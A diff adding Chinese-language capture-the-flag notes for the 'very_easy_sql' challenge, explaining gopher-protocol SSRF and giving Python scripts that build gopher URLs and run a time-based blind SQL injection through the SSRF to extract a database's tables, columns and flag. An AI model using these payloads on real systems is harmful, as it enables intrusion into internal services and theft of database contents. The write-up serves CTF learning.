@@ -2490,3 +2490,114 @@ url解码之后就是 `?code=phpinfo();`
         *注意*
 
         如果上面的payload不能用，可以在`suctf.cc`后加`../../../../../`尝试，多了没问题，少了不行。
+
+## 攻防世界 very_easy_sql(gopher+ssrf+sqli)
+
+1. gopher 协议
+
+   1. 什么是gopher协议
+
+        Gopher协议是一种早期的互联网协议，用于在网络上获取文本信息。它于1991年提出，旨在提供一种简单、高效的方式来浏览和访问文件。
+
+        Gopher协议使用类似于文件系统的层次结构来组织数据，其中每个项目都有一个唯一的标识符。通过Gopher客户端软件，用户可以浏览目录并选择下载或查看文件。Gopher服务器可以提供文本文件、图像文件、二进制文件等。
+
+        与HTTP相比，Gopher协议具有更简单的设计和较少的功能。它基于传输控制协议（TCP）进行通信，默认端口号为70。然而，随着万维网的崛起和HTTP的普及，Gopher协议逐渐被取代。
+
+    2. 利用
+
+        利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面
+
+    3. 语法
+
+        gopher协议的格式通常为：
+
+        ```html
+        gopher://hostname:port/请求方法(get、post等)/path
+        ```
+
+        其中，hostname 表示 Gopher 服务器的主机名或 IP 地址，port 表示 Gopher 服务器监听的端口号（默认为 70），而 path 则是资源的路径。
+
+    4. 举个例子
+
+        要请求 Gopher 服务器上的 /example/file.txt 文本文件，可以使用以下 URL 格式：
+
+        ```html
+        gopher://example.com:端口/example/file.txt
+        ```
+
+        在本地主机的80端口上使用Gopher协议的GET方法访问一个资源：
+
+        ```html
+        gopher://127.0.0.1:80/_GET /index.php HTTP/1.1
+        ```
+
+        /_GET /index.php HTTP/1.1 表示使用 GET 方法请求位于 /index.php 的资源，并且使用 HTTP 1.1 协议版本
+
+    5. gopher协议构造脚本
+
+        ```python
+        import urllib.parse
+
+        host = "127.0.0.1:80"
+        content = "uname=admin&passwd=admin"
+        content_length = len(content)
+
+        test =\
+        """POST /index.php HTTP/1.1
+        Host: {}
+        User-Agent: curl/7.43.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: {}
+
+        {}
+        """.format(host,content_length,content)
+
+        tmp = urllib.parse.quote(test) 
+        new = tmp.replace("%0A","%0D%0A")
+        result = urllib.parse.quote(new) 
+        print("gopher://"+host+"/_"+result)
+        ```
+
+2. sql时间盲注
+
+    *注：* 这里也可以用**报错注入**
+
+    ```python
+    import urllib.parse
+    import requests
+    import time
+    import base64
+    url="http://61.147.171.105:57239//use.php?url="
+    flag=""
+    for pos in range(1,50):
+        for i in range(33,127):
+            #poc="') union select 1,2,if(1=1,sleep(5),1) # "
+
+            ## 爆库
+            # poc="') union select 1,2,if(ascii( substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
+
+            ## 爆表
+            # poc="') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
+
+            ## 爆列
+            poc="') union select 1,2,if(ascii( substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
+            
+            # flag
+            # poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
+            
+            bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
+            final_poc="gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D"+bs+"%3B%250d%250a"
+            t1=time.time()
+            res=requests.get(url+final_poc)
+            t2=time.time()
+            if(t2-t1>2):
+                flag+=chr(i)
+                print(flag)
+                break
+    print(flag)
+    ```
+
+
+
+
